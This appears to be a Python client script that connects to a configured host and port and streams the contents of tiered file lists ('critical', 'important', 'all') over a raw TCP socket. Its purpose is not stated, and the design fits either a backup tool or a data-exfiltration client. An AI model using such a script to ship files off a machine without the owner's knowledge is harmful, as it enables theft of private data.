from parameters import *
from socket import socket, gethostname, AF_INET, SOCK_STREAM
import sys

if __name__ == '__main__':
	
	soc = socket(AF_INET, SOCK_STREAM)
	try:
		soc.connect((HOST, PORT))
	except:
		print("Connection refused!")
		sys.exit()

	if CRITICAL:
		# senf critical files
		for file in CRITICAL_FILES:
			print("Sending ", file)
			
			try:
				f = open(file, 'rb')
			except:
				print("Failed read file", file)
				continue
			data = f.read(BUFF_SIZE)

			while data:
				soc.send(data)
				data = f.read(BUFF_SIZE)

			f.close()


	if IMPORTANT:
		# send important files
		for file in IMPORTANT_FILES:
			print("Sending ", file)
			
			try:
				f = open(file, 'rb')
			except:
				print("Failed read file", file)
				continue
			data = f.read(BUFF_SIZE)

			while data:
				soc.send(data)
				data = f.read(BUFF_SIZE)

			f.close()

	if ALL:
		# send important files
		for file in ALL_FILES:
			print("Sending ", file)
			
			try:
				f = open(file, 'rb')
			except:
				print("Failed read file", file)
				continue
			data = f.read(BUFF_SIZE)

			while data:
				soc.send(data)
				data = f.read(BUFF_SIZE)

			f.close()	

	soc.close()
	sys.exit()


